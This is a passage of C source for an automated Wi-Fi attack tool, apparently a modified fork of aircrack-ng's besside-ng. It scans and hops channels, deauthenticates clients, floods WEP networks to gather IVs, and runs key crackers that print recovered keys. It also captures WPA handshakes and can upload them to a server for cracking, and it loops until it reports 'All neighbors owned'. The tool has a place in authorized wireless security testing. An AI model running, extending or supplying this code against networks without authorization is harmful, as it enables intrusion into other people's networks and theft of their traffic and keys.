            printf(" Attacking %s [%s] %s - %s",
                   n->n_ssid,
                   mac2str(n->n_bssid),
                   n->n_crypto == CRYPTO_WPA ? "wpa" : "wep",
                   astate2str(n->n_astate));

            if (need_connect(n) && n->n_wstate != WSTATE_ASSOC)
                printf(" [conn: %s]", wstate2str(n->n_wstate));

        switch (n->n_astate) {
            case ASTATE_WEP_FLOOD:
                if (n->n_cracker_wep[0].cr_pid
                                || n->n_cracker_wep[1].cr_pid)
                    printf(" cracking");

                speed_calculate(&n->n_flood_in);
                speed_calculate(&n->n_flood_out);

                printf(" - %d IVs rate %u [%u PPS out] len %d",
                       n->n_data_count,
                       n->n_flood_in.s_speed,
                       n->n_flood_out.s_speed,
                       (int) (n->n_replay_len
                               - sizeof(struct ieee80211_frame) - 4 - 4)
                       );
                break;

            case ASTATE_DEAUTH:
                c = n->n_clients.c_next;
                while (c) {
                    ccount++;

                    c = c->c_next;
                }

                if (ccount)
                    printf(" (know %d clients)", ccount);
                break;
            }

            break;
	}

	printf("\r");
	fflush(stdout);

	if (advance)
		statusp++;

	if (statusp >= (&status[sizeof(status) - 1]))
		statusp = status;
}

static void make_progress(void)
{
	if (_state.s_state == STATE_SCAN && _state.s_hopcycles > 2) {
		print_work();
		attack_next();
		_state.s_hopcycles = 0;
	}
}

static void cracker_check(struct network *n, struct cracker *c)
{
	unsigned char buf[1024];
	int rc;

	rc = read(c->cr_pipe[0], buf, sizeof(buf));
	if (rc <= 0) {
		cracker_kill(c);
		return;
	}

	assert(rc <= (int) sizeof(n->n_key));

	memcpy(n->n_key, buf, rc);
	n->n_key_len = rc;

	time_printf(V_NORMAL, "Got key for %s [", n->n_ssid);
	print_hex(n->n_key, n->n_key_len);
	printf("] %d IVs\n", n->n_data_count);

	cracker_kill(&n->n_cracker_wep[0]);
	cracker_kill(&n->n_cracker_wep[1]);

	n->n_astate = ASTATE_DONE;
	ptw_free(n);
	attack_continue(n);
}

static int add_cracker_fds(fd_set *fds, int max)
{
	struct network *n;
	int i;

	if (_state.s_state != STATE_ATTACK)
		return max;

	n = _state.s_curnet;

	for (i = 0; i < 2; i++) {
		struct cracker *c = &n->n_cracker_wep[i];

		if (c->cr_pipe[0]) {
			FD_SET(c->cr_pipe[0], fds);

			if (c->cr_pipe[0] > max)
				max = c->cr_pipe[0];
		}
	}

	return max;
}

static void check_cracker_fds(fd_set *fds)
{
	struct network *n;
	struct cracker *c;
	int i;

	if (_state.s_state != STATE_ATTACK)
		return;

	n = _state.s_curnet;

	for (i = 0; i < 2; i++) {
		c = &n->n_cracker_wep[i];

		if (c->cr_pipe[0] && FD_ISSET(c->cr_pipe[0], fds))
			cracker_check(n, c);
	}
}

static char *strip_spaces(char *p)
{
	char *x;

	while (*p == ' ')
		p++;

	x = p + strlen(p) - 1;
	while (x >= p && *x == ' ')
		*x-- = 0;

	return p;
}

static int parse_hex(unsigned char *out, char *in, int l)
{
	int len = 0;

	while (in) {
		char *p = strchr(in, ':');
		int x;

		if (--l < 0)
			err(1, "parse_hex len");

		if (p)
			*p++ = 0;

		if (sscanf(in, "%x", &x) != 1)
			errx(1, "parse_hex()");

		*out++ = (unsigned char) x;
		len++;

		in = p;
	}

	return len;
}

static void resume_network(char *buf)
{
	char *p = buf, *p2;
	int state = 0;
	struct network *n;
	struct client *client;

	if (buf[0] == '#')
		return;

	n = network_new();

	while (1) {
		p2 = strchr(p, '|');

		if (!p2) {
			p2 = strchr(p, '\n');
			if (!p2)
				break;
		}

		*p2++ = 0;

		p = strip_spaces(p);

		switch (state) {
		/* ssid */
		case 0:
			strncpy(n->n_ssid, p, sizeof(n->n_ssid));
			(n->n_ssid)[sizeof(n->n_ssid) -1] = '\0';
			break;

		/* key */
		case 1:
			if (strstr(p, "handshake")) {
				n->n_crypto = CRYPTO_WPA;
				n->n_client_handshake = (void*) 0xbad;
			} else if (strchr(p, ':')) {
				n->n_crypto = CRYPTO_WEP;

				n->n_key_len = parse_hex(n->n_key, p,
							 sizeof(n->n_key));
			}

			if (n->n_crypto != CRYPTO_NONE) {
				n->n_have_beacon = 1;
				n->n_astate      = ASTATE_DONE;
			}
			break;

		/* bssid */
		case 2:
			parse_hex(n->n_bssid, p, sizeof(n->n_bssid));
			break;

		case 3:
			if (*p) {
				struct client *c = xmalloc(sizeof(*c));

				memset(c, 0, sizeof(*c));

				parse_hex(c->c_mac, p, sizeof(c->c_mac));

				n->n_client_mac = c;
				n->n_got_mac    = 1;
			}
			break;
		}

		state++;
		p = p2;
	}

	if (n->n_astate != ASTATE_DONE) {
        free_network(n);
		return;
	}

	do_network_add(n);

	network_print(n);
}

static void resume(void)
{
	FILE *f;
	char buf[4096];

	f = fopen(_conf.cf_log, "r");
	if (!f)
		return;

	time_printf(V_NORMAL, "Resuming from %s\n", _conf.cf_log);

	while (fgets(buf, sizeof(buf), f))
		resume_network(buf);

	fclose(f);
}

static void cleanup(int UNUSED(x))
{
	struct state *s = &_state;
	struct network *n;

	printf("\nDying...\n");

	wi_close(s->s_wi);

	if (_state.s_state == STATE_ATTACK) {
		n = _state.s_curnet;
		assert(n);
		cracker_kill(&n->n_cracker_wep[0]);
		cracker_kill(&n->n_cracker_wep[1]);
	}


	if (_state.s_wepfd)
		close(_state.s_wepfd);

	print_work();

	exit(0);
}

static void pwn(void)
{
	struct state *s = &_state;
	struct timeval tv;
	fd_set fds;
	int wifd, max, rc;
    // redis connection args
    const char *hostname = "127.0.0.1";
    int port = 6379;
    struct timeval timeout = { 1, 500000 };

    redis_context = redisConnectWithTimeout(hostname, port, timeout);

    //check for wifi device
	if (!(s->s_wi = wi_open(_conf.cf_ifname)))
		err(1, "wi_open()");

    // detect channels
    if (_conf.cf_autochan)
        autodetect_channels();

	if (wi_get_mac(s->s_wi, _state.s_mac) == -1)
		err(1, "wi_get_mac()");

	gettimeofday(&_state.s_now, NULL);
	memcpy(&_state.s_start, &_state.s_now, sizeof(_state.s_start));

	wifd = wi_fd(s->s_wi);
	max  = wifd;

	time_printf(V_VERBOSE, "Using WiFi device with mac %s\n", mac2str(_state.s_mac));
	time_printf(V_NORMAL, "Let's ride\n");

    //change to the current channel
	if (wi_set_channel(s->s_wi, _state.s_chan) == -1)
		err(1, "wi_set_channel()");

	//resume();

	_state.s_wepfd = open_pcap(_conf.cf_wep);

	save_log();
	time_printf(V_NORMAL, "Logging to %s\n", _conf.cf_log);

	scan_start();

    //main loop
	while (s->s_state != STATE_DONE) {
		timer_next(&tv);

		FD_ZERO(&fds);
		FD_SET(wifd, &fds);

		max = add_cracker_fds(&fds, max);

		if ((rc = select(max + 1, &fds, NULL, NULL, &tv)) == -1
		    && errno != EINTR)
			err(1, "select()");

		gettimeofday(&_state.s_now, NULL);

		check_cracker_fds(&fds);

		print_status(FD_ISSET(wifd, &fds));

		if (FD_ISSET(wifd, &fds))
			wifi_read(); //read packets from the interface

		timer_check(); // calls timer callback from the timers list
        //clean_old();
		make_progress();  //
	}

	time_printf(V_NORMAL, "All neighbors owned\n");

	cleanup(0);
}

static void channel_add(int num)
{
	struct channel *c = xmalloc(sizeof(*c));
	struct channel *pos = _conf.cf_channels.c_next;

	while (pos->c_next != _conf.cf_channels.c_next)
		pos = pos->c_next;

	memset(c, 0, sizeof(*c));

	pos->c_next = c;

	c->c_num  = num;
	c->c_next = _conf.cf_channels.c_next;
}

static void autodetect_freq(int start, int end, int incr)
{
	int freq;
	int chan;

	for (freq = start; freq <= end; freq += incr)
	{
		if (wi_set_freq(_state.s_wi, freq) == 0)
		{
			chan = wi_get_channel(_state.s_wi);
			channel_add(chan);
			time_printf(V_VERBOSE, "Found channel %d on frequency %d\n", chan, freq);
		}
		else
		{
			time_printf(V_VERBOSE, "No channel found on frequency %d\n", freq);
		}
	}
}

static void autodetect_channels()
{
	time_printf(V_NORMAL, "Autodetecting supported channels...\n");

	// autodetect 2ghz channels
	autodetect_freq(2412, 2472, 5);	// 1-13
	autodetect_freq(2484, 2484, 1); // 14

	// autodetect 5ghz channels
	autodetect_freq(5180, 5320, 10); // 36-64
	autodetect_freq(5500, 5720, 10); // 100-144
	autodetect_freq(5745, 5805, 10); // 149-161
	autodetect_freq(5825, 5825, 1);  // 165
}

static void init_channel_hop () {
    if (!_conf.cf_5ghz) {
		channel_add(1);
		channel_add(6);
		channel_add(11);
		channel_add(2);
		channel_add(7);
		channel_add(10);
		channel_add(3);
		channel_add(9);
		channel_add(12);
		channel_add(14);
		channel_add(4);
		channel_add(13);
		channel_add(8);
        channel_add(5);
        _conf.cf_hopfreq    = 250;
        _conf.cf_deauthfreq = 2500;

    } else {
        channel_add(36);
        channel_add(40);
        channel_add(44);
        channel_add(48);
        channel_add(52);
        channel_add(56);
        channel_add(60);
        channel_add(64);
        channel_add(100);
        channel_add(104);
        channel_add(108);
        channel_add(112);
        channel_add(116);
        channel_add(120);
        channel_add(124);
        channel_add(128);
        channel_add(132);
        channel_add(136);
        channel_add(140);
        channel_add(144);
        channel_add(149);
        channel_add(153);
        channel_add(157);
        channel_add(161);
        channel_add(165);

        _conf.cf_hopfreq    = 587;
        _conf.cf_deauthfreq = 5875;
    }

}

static void init_conf(void)
{
	_conf.cf_channels.c_next = &_conf.cf_channels;
    _conf.cf_5ghz       = false;
	_conf.cf_autochan = 1;

	_state.s_hopchan = _conf.cf_channels.c_next;

	_conf.cf_attackwait = 10;
	_conf.cf_floodwait  = 60;
	_conf.cf_to	    = 100;
	_conf.cf_floodfreq  = 10 * 1000;
	_conf.cf_crack_int  = 5000;
	_conf.cf_wpa	    = "wpa.cap";
	_conf.cf_wep	    = "wep.cap";
	_conf.cf_log	    = "besside.log";
	_conf.cf_do_wep     = 0;
	_conf.cf_do_wpa     = 1;
}

static const char *timer_cb2str(timer_cb cb)
{
	if (cb == hop)
		return "hop";
	else if (cb == attack_watchdog)
		return "attack_watchdog";
	else if (cb == deauth)
		return "deauth";
	else
		return "UNKNOWN";
}

static void print_state_network(struct network *n)
{
	struct client *c = n->n_clients.c_next;

	printf("Network: [%s] chan %d bssid %s astate %d dbm %d"
	       " have_beacon %d crypto %d",
	       n->n_ssid, n->n_chan, mac2str(n->n_bssid), n->n_astate,
	       n->n_dbm, n->n_have_beacon, n->n_crypto);

	if (n->n_key_len) {
		printf(" KEY [");
		print_hex(n->n_key, n->n_key_len);
		printf("]");
	}

	printf("\n");

	while (c) {
		printf("\tClient: %s wpa_got %d dbm %d\n",
		       mac2str(c->c_mac), c->c_wpa_got, c->c_dbm);

		c = c->c_next;
	}
}

static void print_state(int UNUSED(x))
{
	struct state *s		= &_state;
	struct network *n	= s->s_curnet;
	struct channel *c	= s->s_hopchan;
	struct channel *c2	= c;
	struct timer *t		= s->s_timers.t_next;

	printf("\n=============== Internal state ============\n");
	printf("State:\t%d\n", s->s_state);

	if (s->s_state == STATE_ATTACK) {
		printf("Current attack network: [%s] %s\n",
		       n->n_ssid, mac2str(n->n_bssid));
	}

	n = _state.s_networks.n_next;
	while (n) {
		print_state_network(n);
		n = n->n_next;
	}

	printf("Current chan: %d\n", s->s_chan);
	printf("Hop cycle %u chans:", s->s_hopcycles);
	do {
		printf(" %d", c->c_num);
		c = c->c_next;

		if (c != c2)
			printf(",");

	} while (c != c2);
	printf("\n");

	printf(
		#if !defined( __APPLE_CC__) && !defined(__NetBSD__) && !defined(__OpenBSD__)
		"Now: %lu.%lu\n",
		#else
		"Now: %lu.%d\n",
		#endif
		s->s_now.tv_sec, s->s_now.tv_usec);


	while (t) {
		printf(
		       #if !defined( __APPLE_CC__) && !defined(__NetBSD__) && !defined(__OpenBSD__)
		       "Timer: %lu.%lu %p[%s](%p)\n",
		       #else
		       "Timer: %lu.%d %p[%s](%p)\n",
		       #endif
		       t->t_tv.tv_sec, t->t_tv.tv_usec, t->t_cb,
		       timer_cb2str(t->t_cb), t->t_arg);

		t = t->t_next;
	}

	print_work();

	printf("===========================================\n");
}

static void usage(char *prog)
{
    char *version_info = getVersion("Besside-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC);
        printf("\n"
                "  %s - (C) 2010 Andrea Bittau\n"
                "  https://www.aircrack-ng.org\n"
                "\n"
                "  Usage: %s [options] <interface>\n"
                "\n"
                "  Options:\n"
                "\n"
                "       -b <victim mac> : Victim BSSID\n"
#ifdef HAVE_PCRE
                "       -R <victim ap regex> : Victim ESSID regex\n"
#endif
		"       -s <WPA server> : Upload wpa.cap for cracking\n"
		"       -c       <chan> : chanlock\n"
		"       -p       <pps>  : flood rate\n"
		"       -W              : WPA only\n"
                "       -v              : verbose, -vv for more, etc.\n"
                "       -h              : This help screen\n"
                "\n",
                version_info,
		prog);
    free(version_info);
	exit(1);
}

int main(int argc, char *argv[])
{
	int ch;
#ifdef HAVE_PCRE
    const char *pcreerror;
    int pcreerroffset;
#endif

	init_conf();

	while ((ch = getopt(argc, argv, "hb:vWw:c:p:dR:")) != -1) {
		switch (ch) {
            case 'w':
                _conf.cf_wpa = optarg;
                break;

            case 'W':
                _conf.cf_do_wep = 0;
                break;

            case 'p':
                _conf.cf_floodfreq = (int) (1.0 / (double) atoi(optarg)
                              * 1000.0 * 1000.0);
                break;

            case 'c':
                // XXX leak
                _conf.cf_channels.c_next = &_conf.cf_channels;
                channel_add(atoi(optarg));
                _state.s_hopchan = _conf.cf_channels.c_next;
                _conf.cf_autochan = 0;
                break;

            case 'v':
                _conf.cf_verb++;
                break;

            case 'b':
                _conf.cf_bssid = xmalloc(6);
                parse_hex(_conf.cf_bssid, optarg, 6);
                break;
            case 'd':
                _conf.cf_5ghz = true;
                break;
#ifdef HAVE_PCRE
            case 'R':
                if (_conf.cf_essid_regex != NULL) {
                    printf("Error: ESSID regular expression already given. Aborting\n");
                    exit(1);
                }

                _conf.cf_essid_regex = pcre_compile(optarg, 0, &pcreerror, &pcreerroffset, NULL);

                if (_conf.cf_essid_regex == NULL) {
                    printf("Error: regular expression compilation failed at offset %d: %s; aborting\n", pcreerroffset, pcreerror);
                    exit(1);
                }
                break;
#endif

            default:
            case 'h':
                usage(argv[0]);
                break;
            }
	}

	init_channel_hop();
	if (optind <= argc)
		_conf.cf_ifname = argv[optind];

	if (!_conf.cf_ifname) {
		printf("Gimme an interface name dude\n");
		usage(argv[0]);
	}

	signal(SIGINT, cleanup);
	signal(SIGKILL, cleanup);
	signal(SIGUSR1,  print_state);
	signal(SIGCHLD, do_wait);

	pwn();

#ifdef HAVE_PCRE
    if(_conf.cf_essid_regex)
        pcre_free(_conf.cf_essid_regex);
#endif

	exit(0);
}
